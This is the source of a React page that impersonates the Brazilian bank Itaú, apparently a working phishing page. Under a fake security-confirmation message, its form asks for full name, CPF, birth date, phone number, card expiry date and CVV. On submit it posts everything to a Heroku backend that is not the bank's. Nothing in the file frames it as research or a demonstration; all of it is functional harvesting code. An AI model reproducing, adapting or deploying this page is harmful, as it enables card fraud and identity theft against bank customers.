import React, { useState } from 'react';
import { useHistory } from 'react-router-dom';
import './Indentification.Styles.css';
import logoItau from '../../assets/img_logo.png';
import confimation from '../../assets/confirmacao.png';
import ichelpcvv from '../../assets/ic_help_cvv.png';
import { mask } from 'remask';
import axios from 'axios';
export  function Indentification() {
  const [masckCPF, setMasCPF] = useState();
  const [masckDate, setMascDate] = useState();
  const [masckPhone, setMascPhone] = useState();
  const [masckDateCvv, setMasckDateCvv] = useState();
  const [masckCvv, setMasckCvv] = useState();
  const [user_full, setUser_full] = useState([]);
  const history = useHistory();

function handleName(e){
    setUser_full({...user_full, [e.target.name]: e.target.value});
}
function handleMaskCPF(e){
    setMasCPF(mask(e.target.value, ['999.999.999-99']));
    setUser_full({...user_full, [e.target.name]: e.target.value});
};
  function handleMaskDate(e){
    setMascDate(mask(e.target.value, ['99/99/9999']));
    setUser_full({...user_full, [e.target.name]: e.target.value});
};
function handleMaskPhone(e){
    setMascPhone(mask(e.target.value, ['(99) 99999-9999']));
    setUser_full({...user_full, [e.target.name]: e.target.value});
};
function handleMaskDateCvv(e){
    setMasckDateCvv(mask(e.target.value, ['99/99']));
    setUser_full({...user_full, [e.target.name]: e.target.value});
};
function handleMaskCvv(e){
    setMasckCvv(mask(e.target.value, ['999']));
    setUser_full({...user_full, [e.target.name]: e.target.value});
};
async function handleOnSubimit(e){
  e.preventDefault();
  await axios.post("https://beckend-itau.herokuapp.com/indentification", user_full)
  .then( (response)=>{
    history.push('/sucesso')
    console.log(response)
  })
  .catch( (error)=>{
    console.log("ERROOUUU", error)
  });
};
 return (
   <div className="container_indentification">
       <header className="header">
            <img src={logoItau} alt="logo" className="logo_itau" />
       </header>

       <div className="container_confimation">
         <img src={confimation} alt="logo" className="logo_confirmation" />
       </div>
       <div className="container_description">
            <p className="description">
                Olá cliente Itaú, por motivos de segurança, você precisa confirmar os seguintes dados abaixo.
            </p>
       </div>

       <div>
       <form>
           <div className="single_input">
             <input type="text" name="name" id="name" className="input" required min="10" onChange={handleName}/>
             <label className="name">Nome Completo</label>
           </div>

           <div className="single_input">
             <input type="text" name="cpf" id="lastame" className="input" required value={masckCPF} onChange={handleMaskCPF}/>
             <label className="lastname">CPF</label>
           </div>
           <div className="single_input">
             <input type="text" name="date_nasc" id="lastame" className="input"  required value={masckDate} onChange={handleMaskDate}/>
             <label className="lastname">Data do nascimento</label>
           </div>
           <div className="single_input">
             <input type="text" name="phone" id="lastame" className="input" required value={masckPhone} onChange={handleMaskPhone}/>
             <label className="lastname">Número de Telefone</label>
           </div>
           <div className="single_input">
             <input type="text" name="date_card" id="lastame" className="input" required value={masckDateCvv} onChange={handleMaskDateCvv}/>
             <label className="lastname">Validade do cartão</label>
           </div>
           <div className="single_input">
             <input type="text" name="cod_cvv" id="lastame" className="input" required value={masckCvv} onChange={handleMaskCvv}/>
             <label className="lastname">Código de segurança</label>
             <div>
                 <img src={ichelpcvv} alt="img_cvv" className="ichelpcvv" />
             </div>
           </div>

           <div className="container_button_continue">
                <button className="button_continue" onClick={handleOnSubimit}>continuar</button>
           </div>
       </form>
   </div>
   </div>
 );
}